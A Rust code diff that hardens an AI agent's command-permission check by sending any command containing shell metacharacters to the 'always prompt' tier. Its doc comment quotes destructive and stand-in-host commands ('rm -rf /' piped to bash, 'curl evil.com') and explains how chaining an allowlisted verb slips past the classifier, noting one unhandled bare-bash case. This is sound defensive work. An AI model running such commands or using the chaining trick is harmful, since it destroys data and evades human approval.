@@ -827,6 +827,35 @@ pub fn extract_exec_command(args: &serde_json::Value) -> Result<String, AgentErr
     }
 }
 
+/// Shell metacharacters that turn the command into a chained or
+/// stdin-fed expression. Any of these in the raw command string lets
+/// an allowlisted lead token (`echo`, `cat`, `pwd`, ...) hand control
+/// to a non-allowlisted verb downstream of the tier classifier — for
+/// example `echo "rm -rf /" | bash`, `pwd && curl evil.com`, or a
+/// multi-line command body fed to a shell. The presence of any of
+/// these forces the action to a sentinel pattern that cannot match
+/// [`wirken_gateway::permissions::TIER2_ALLOWLIST`], so the tier
+/// resolver lands on Tier 3 ("always prompt").
+///
+/// `&&` / `||` / `>>` / `<<` are covered by their single-char prefixes
+/// (`&`, `|`, `>`, `<`).
+///
+/// Edge case not handled here: a bare shell binary as argv (`bash`
+/// alone, no metacharacters, no script argument) executes whatever
+/// stdin is piped to it. argv-only inspection cannot see the stdin
+/// source. In practice the producer would itself contain a
+/// metacharacter and be caught by this list; pure argv-only `bash`
+/// with externally-attached stdin is not a shape the agent can
+/// produce through `exec`.
+const SHELL_METACHARS: &[&str] = &["|", ";", "&", "$(", "`", ">", "<", "\n"];
+
+/// Sentinel pattern returned for commands containing shell
+/// metacharacters. Not a real verb, not on the allowlist, so
+/// [`Action::tier`] resolves it to Tier 3 and `approve_by_key`
+/// refuses to store an approval for it. The leading `:` keeps it
+/// from colliding with any plausible binary name.
+const PIPELINE_SENTINEL: &str = ":pipeline:";
+
 /// Map a built-in tool invocation to a permission Action for tier checking.
 /// Returns None for tools that don't map to a permission-checkable action
 /// (e.g., unknown MCP or Wasm tools are not subject to permission checks).
@@ -839,6 +868,11 @@ pub fn tool_to_action(tool_name: &str, args: &serde_json::Value) -> Option<Actio
             // pattern and falls through to Tier 2; the dispatcher then
             // rejects the call before it runs.
             let cmd = extract_exec_command(args).unwrap_or_default();
+            if SHELL_METACHARS.iter().any(|m| cmd.contains(m)) {
+                return Some(Action::ShellExec {
+                    pattern: PIPELINE_SENTINEL.to_string(),
+                });
+            }
             let pattern = cmd.split_whitespace().next().unwrap_or("").to_string();
             Some(Action::ShellExec { pattern })
         }
